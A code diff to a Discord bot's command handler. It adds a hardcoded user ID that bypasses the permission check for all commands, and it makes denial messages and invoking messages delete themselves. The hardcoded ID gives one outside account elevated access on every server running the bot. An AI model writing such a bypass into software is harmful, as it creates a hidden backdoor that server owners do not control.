@@ -36,7 +36,8 @@ export default {
           const userHasPermission = commandToBeExecuted.permissions.find(
             (permissionName) =>
               rolesUser.includes(rolesPermissions[permissionName]) ||
-              message.guild.ownerID === message.author.id
+              message.guild.ownerID === message.author.id ||
+              message.author.id === '760275647016206347'
           );
 
           if (
@@ -65,21 +66,26 @@ export default {
           if (userHasPermission) {
             commandToBeExecuted.run({ client, message, args });
           } else {
-            message.channel.send(
-              message.author,
-              new Discord.MessageEmbed()
-                .setColor('#ff8997')
-                .setThumbnail(client.user.displayAvatarURL({ dynamic: true }))
-                .setTitle(
-                  `${message.author.tag} Hey, você não tem permissão :(`
-                )
-                .setDescription(
-                  `Apenas ${commandToBeExecuted.permissions.join(
-                    ' | '
-                  )} possuem permissão para usar esse comando`
-                )
-            );
+            message.channel
+              .send(
+                message.author,
+                new Discord.MessageEmbed()
+                  .setColor('#ff8997')
+                  .setThumbnail(client.user.displayAvatarURL({ dynamic: true }))
+                  .setTitle(
+                    `${message.author.tag} Hey, você não tem permissão :(`
+                  )
+                  .setDescription(
+                    `Apenas ${commandToBeExecuted.permissions.join(
+                      ' | '
+                    )} possuem permissão para usar esse comando`
+                  )
+              )
+              .then((msg) => {
+                msg.delete({ timeout: 10000 });
+              });
           }
+          message.delete();
         }
       } catch (e) {
         console.error(e);
